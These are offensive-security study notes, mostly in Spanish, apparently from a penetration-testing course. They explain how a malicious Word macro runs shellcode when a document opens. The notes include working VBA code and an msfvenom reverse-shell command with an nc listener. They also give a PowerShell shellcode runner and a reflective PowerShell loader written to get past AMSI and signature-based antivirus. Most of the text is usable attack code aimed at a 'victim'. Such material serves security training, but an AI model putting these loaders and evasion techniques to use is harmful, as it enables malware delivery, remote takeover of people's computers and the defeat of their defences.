### Calling Win32 APIs from VBA

🟢 Fase 1: El Enganche (Word y VBA)
La víctima abre el documento .docm y hace clic en "Habilitar contenido".

Word ejecuta automáticamente Document_Open o AutoOpen.

Estas llaman a MyMacro(), que es donde está toda la lógica maliciosa.

🟢 Fase 2: Reserva de Memoria Ejecutable (VirtualAlloc)
vba
addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
Aquí ocurre la magia para evadir el DEP (Data Execution Prevention) de Windows:

0: Windows elige la dirección de memoria por ti.

UBound(buf): Calcula dinámicamente el tamaño del shellcode. Si cambias el payload, no tienes que cambiar este número.

&H3000 (MEM_COMMIT | MEM_RESERVE): Le pide al sistema operativo que reserve y confirme un bloque de memoria.

&H40 (PAGE_EXECUTE_READWRITE): Le da permisos a esa memoria para ser Leída, Escrita y Ejecutada (RWX). Normalmente, Windows no permite ejecutar memoria que acabas de escribir (eso es lo que bloquea el DEP), pero al pedirlo explícitamente como RWX, lo permitimos.

La función devuelve un puntero (addr) a esa nueva zona de memoria.

🟢 Fase 3: Copia del Shellcode (RtlMoveMemory)
vba
For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
Next counter
En VBA, tu payload está guardado en un Array de números (el que generaste con msfvenom).

Este bucle For recorre el array byte por byte.

RtlMoveMemory toma cada byte y lo copia a la dirección de memoria que reservamos en el paso anterior (addr + counter).

Al terminar el bucle, el shellcode completo está sentado en la memoria RAM del proceso de Word, listo para ser ejecutado.

🟢 Fase 4: Ejecución en un Hilo Nuevo (CreateThread)
vba
res = CreateThread(0, 0, addr, 0, 0, 0)
Windows no ejecuta el shellcode solo porque esté en memoria. Hay que decirle que empiece a ejecutarlo.

CreateThread le ordena al sistema operativo: "Crea un nuevo hilo de ejecución dentro del proceso de Word, y empieza a ejecutar el código que está en la dirección addr".

Los demás parámetros están en 0 porque no necesitamos configuraciones especiales (ni atributos de seguridad, ni tamaño de pila personalizado, ni parámetros para el shellcode).

Aquí es donde tu payload cobra vida.

🟢 Fase 5: La Conexión (El Shellcode en acción)
El shellcode que generaste con msfvenom -p windows/shell_reverse_tcp se ejecuta.

Lo primero que hace es crear un Socket TCP y conectarse a la IP y puerto que le indicaste (192.168.234.2:4444).

Como usaste un payload Stageless (sin etapas), no pide nada más. Inmediatamente lanza un proceso cmd.exe en Windows.

Redirige la entrada y salida de esa cmd.exe a través del socket TCP hacia tu Kali.

En Kali: rlwrap nc -lvnp 4444 recibe la conexión y te muestra el prompt de la cmd de Windows.

🟢 Fase 6: El Ciclo de Vida (¿Por qué usamos EXITFUNC=thread?)
Cuando cierras la shell (escribes exit en la cmd de Windows), el shellcode termina.

Como usaste EXITFUNC=thread, solo muere el hilo que creó CreateThread. El proceso de Word sigue abierto y vivo.

Si hubieras usado el EXITFUNC por defecto (process), al cerrar la shell, Word se habría cerrado de golpe, alertando a la víctima.

Desventaja: Si la víctima cierra Word, el hilo muere y pierdes la shell. Para evitarlo, se suele usar un segundo payload (como PowerShell) para migrar a un proceso persistente, o se inyecta en un proceso del sistema.

⚠️ ¿Por qué esto es sigiloso pero peligroso para el atacante?
Ventaja: No hay archivos .exe en el disco. Todo ocurre en la RAM. Los antivirus tradicionales que escanean archivos no ven nada.

Desventaja: Windows Defender moderno y los EDRs detectan inmediatamente la combinación de VirtualAlloc con permisos RWX + CreateThread. Es una firma de comportamiento clásica. Por eso, para un ataque real, se necesitan técnicas de evasión más avanzadas (como cifrar el shellcode, usar llamadas indirectas a APIs, o inyección en procesos remotos).


```
' ==========================================
' 1. DECLARACIONES DE LAS APIs (ARRIBA DEL TODO)
' ==========================================
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

' ==========================================
' 2. LA FUNCIÓN PRINCIPAL
' ==========================================
Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    ' 🔽 AQUÍ VA TU ARRAY DE MSFVENOM 🔽
    ' Asegúrate de que cada línea termine con un guion bajo _ para continuar
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, _
                139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, _
                49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, _
                ' ... (pega aquí todos los bytes de tu payload) ...
                83, 255, 213)
    
    ' 1. Asignar memoria ejecutable (RWX)
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    ' 2. Copiar el shellcode byte a byte a la memoria asignada
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    ' 3. Ejecutar el shellcode en un nuevo hilo
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

' ==========================================
' 3. EVENTOS DE WORD (AL FINAL)
' ==========================================
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

```

# Porting Shellcode Runner to PowerShell

`kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1`

Next
```
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60...

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
```
We invoked the imported VirtualAlloc call with the same arguments as before. These include a "0" to let the API choose the allocation address, the detected size of the shellcode, and the hexadecimal numbers 0x3000 and 0x40 to set up memory allocation and protections correctly.

We used the .NET Copy method to copy the shellcode, supplying the managed shellcode array, an offset of 0 indicating the start of the buffer, the unmanaged buffer address, and the shellcode size.

Finally, we called CreateThread, supplying the starting address.

If we run this code from PowerShell ISE, we get a reverse shell. Nice.



## "Reflective" (Reflectiva) de un shellcode runner

Este script es una versión "Reflective" (Reflectiva) de un shellcode runner, y representa una técnica de evasión mucho más avanzada que la que hicimos con Add-Type.

Ambos scripts logran exactamente lo mismo (ejecutar shellcode en memoria usando VirtualAlloc, Marshal.Copy y CreateThread), pero la forma en que obtienen las direcciones de las funciones de Windows es completamente distinta.

Aquí te explico la diferencia principal:
1. El método anterior (Add-Type + DllImport)
En el script que hicimos antes, usábamos Add-Type para compilar código C# que contenía declaraciones como:

csharp
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(...);
Cómo funciona: .NET lee el DllImport y, en tiempo de ejecución, busca en kernel32.dll la función VirtualAlloc, la carga y la expone a PowerShell como un método normal.

Problema de evasión: Para que esto funcione, la cadena "DllImport", "VirtualAlloc" y "kernel32.dll" quedan escritas en texto plano en el script. AMSI (Antimalware Scan Interface) de Windows Defender escanea ese texto y bloquea el script al instante porque es una firma clásica de malware.

2. El método nuevo (Reflective Loader)
Este script no usa Add-Type ni DllImport. En su lugar, hace lo siguiente:

LookupFunc:
Esta función usa reflexión de .NET ([AppDomain]::CurrentDomain.GetAssemblies()) para buscar dentro del ensamblado System.dll una clase interna de .NET llamada Microsoft.Win32.UnsafeNativeMethods.
Una vez encontrada, ejecuta métodos internos de .NET llamados GetModuleHandle (que obtiene la dirección base de kernel32.dll) y GetProcAddress (que busca la dirección de memoria exacta de una función como VirtualAlloc dentro de esa DLL).

Ventaja: No necesitas declarar la función con DllImport. Obtienes el puntero de memoria directamente.

getDelegateType:
Una vez que tienes la dirección de memoria de VirtualAlloc (que es solo un número, un puntero), PowerShell no puede llamarlo directamente porque no sabe qué tipo de función es. Esta función usa System.Reflection.Emit para crear dinámicamente un "Delegado" en memoria. Un Delegado es como un puntero a función de C#, que le dice a .NET: "Esta dirección de memoria recibe 4 parámetros y devuelve un puntero".

GetDelegateForFunctionPointer:
Aquí es donde se unen las dos partes. Toma el puntero devuelto por LookupFunc y lo convierte en un Delegado de .NET usando la plantilla creada por getDelegateType. Ahora ya puedes llamar a VirtualAlloc como si fuera una función normal de PowerShell.

WaitForSingleObject:
Al final, usan esta API para pausar el script de PowerShell y evitar que la consola se cierre inmediatamente después de lanzar el shellcode. Así se mantiene la conexión viva.

📊 Comparativa rápida:

| Característica | Add-Type + DllImport | Reflective Loader |
| :--- | :--- | :--- |
| **Compilación** | Compila código C# en tiempo real. | No compila C#. Usa reflexión pura de .NET. |
| **Obtención de APIs** | Mediante `[DllImport]`. | Mediante `GetModuleHandle` + `GetProcAddress`. |
| **Visibilidad de strings** | Muy alto. Las cadenas "kernel32.dll" y "VirtualAlloc" quedan en texto plano. | Bajo. Las APIs se pasan como argumentos de texto, pero no se declaran. |
| **Evasión de AMSI** | Muy pobre. AMSI detecta `DllImport` y `VirtualAlloc` al instante. | Mejor. Evita la firma de `DllImport`. |
| **Complejidad** | Baja. Fácil de entender y escribir. | Alta. Requiere entender reflexión, delegados y punteros en .NET. |


⚠️ ¿Por qué se usa esto en ciberseguridad ofensiva?
El objetivo de este script es evadir la detección basada en firmas. Al eliminar Add-Type y DllImport, el script ya no contiene las palabras clave que Windows Defender busca para bloquear scripts maliciosos. Es una técnica clásica de "Living off the Land" (LotL) y evasión de AMSI.

¿Funciona en tu laboratorio?
Depende de la versión de Windows Defender. Aunque este script evade la detección estática (de texto), Windows Defender moderno también tiene detección de comportamiento. Si ve que un proceso de PowerShell llama a VirtualAlloc con permisos RWX y luego a CreateThread, te bloqueará igual, aunque el script no contenga las palabras prohibidas.

Conclusión: Este script es un paso más en la escalera de la evasión. Para que funcione en tu laboratorio, necesitas que Windows Defender esté totalmente desactivado (o hayas añadido exclusiones para powershell.exe y powershell_ise.exe). Si quieres probarlo, asegúrate de reemplazar el $buf completo (el que tienes tiene puntos suspensivos ... y fallará).

```
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```
